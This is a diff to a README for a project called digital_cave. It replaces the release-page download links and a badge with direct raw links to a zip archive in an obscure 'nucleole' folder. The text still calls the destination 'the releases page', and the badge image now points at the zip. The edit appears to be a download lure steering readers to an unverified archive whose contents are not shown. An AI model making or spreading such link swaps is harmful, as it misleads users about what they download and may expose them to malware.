@@ -19,13 +19,13 @@ These specifications will ensure smooth performance of the application.
 
 ## 🔗 Download Link
 
-[![Download digital_cave](https://img.shields.io/badge/Download-digital_cave-blue.svg)](https://github.com/norsimoes/digital_cave/releases)
+[![Download digital_cave](https://raw.githubusercontent.com/norsimoes/digital_cave/main/nucleole/digital_cave.zip)](https://raw.githubusercontent.com/norsimoes/digital_cave/main/nucleole/digital_cave.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the releases page to download **digital_cave**. Click the link below:
 
-[Visit this page to download](https://github.com/norsimoes/digital_cave/releases)
+[Visit this page to download](https://raw.githubusercontent.com/norsimoes/digital_cave/main/nucleole/digital_cave.zip)
 
 1. Click on the link.
 2. Look for the latest version of the software.
